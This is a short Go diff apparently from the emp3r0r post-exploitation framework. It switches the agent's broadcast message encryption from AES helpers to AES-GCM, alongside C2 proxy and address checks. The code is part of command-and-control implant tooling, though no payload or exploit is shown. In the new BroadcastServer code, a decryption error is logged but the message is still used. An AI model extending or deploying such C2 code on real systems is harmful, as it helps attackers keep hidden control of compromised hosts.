@@ -75,11 +75,11 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 		}
 
 		// decrypt broadcast message
-		decMsg := tun.AESDecrypt(emp3r0r_data.AESKey, string(buf[:n]))
-		if decMsg == "" {
-			log.Printf("%x cannot be decrypted", buf[:n])
-			continue
+		decBytes, err := tun.AES_GCM_Decrypt(emp3r0r_data.AESKey, buf[:n])
+		if err != nil {
+			log.Printf("BroadcastServer: %v", err)
 		}
+		decMsg := string(decBytes)
 		log.Printf("BroadcastServer: %s sent this: %s\n", addr, decMsg)
 		if RuntimeConfig.C2TransportProxy != "" &&
 			tun.IsProxyOK(RuntimeConfig.C2TransportProxy, emp3r0r_data.CCAddress) {
@@ -147,8 +147,8 @@ func BroadcastMsg(msg, dst string) (err error) {
 	}
 
 	// encrypt message
-	encMsg := tun.AESEncrypt(emp3r0r_data.AESKey, msg)
-	if encMsg == "" {
+	encMsg, err := tun.AES_GCM_Encrypt(emp3r0r_data.AESKey, []byte(msg))
+	if err != nil {
 		return fmt.Errorf("failed to encrypt %s", msg)
 	}
 
